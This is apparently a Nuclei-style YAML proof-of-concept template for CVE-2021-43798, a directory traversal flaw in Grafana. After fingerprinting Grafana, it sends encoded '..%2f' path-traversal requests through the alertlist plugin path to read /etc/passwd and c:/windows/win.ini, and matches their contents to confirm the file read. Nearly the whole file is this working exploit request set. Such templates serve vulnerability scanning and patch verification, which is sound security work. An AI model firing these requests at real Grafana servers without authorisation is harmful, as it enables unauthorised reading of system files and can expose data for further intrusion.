id: yaml-poc-grafana-grafana-readfile-CVE-2021-43798
info:
  name: Yaml Poc Grafana Grafana Readfile Cve 2021 43798
  author: converted
  severity: medium
  description: 'Converted from xpoc: yaml-poc-grafana-grafana-readfile-CVE-2021-43798'
  tags: grafana,lfi,cve
  classification:
    cve-id: CVE-2021-43798
  reference:
  - http://packetstormsecurity.com/files/165198/Grafana-Arbitrary-File-Reading.html
  - http://packetstormsecurity.com/files/165221/Grafana-8.3.0-Directory-Traversal-Arbitrary-File-Read.html
  - http://www.openwall.com/lists/oss-security/2021/12/09/2
  - http://www.openwall.com/lists/oss-security/2021/12/10/4
  - https://cxsecurity.com/issue/WLB-2021120041
http:
- method: GET
  path:
  - /
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - Sometimes restarting grafana-server can help
  - type: regex
    part: body
    regex:
    - window.grafana[b|B]oot[d|D]ata\\s*=\\s*{
- method: GET
  path:
  - /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
- method: GET
  path:
  - /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - for 16-bit app support
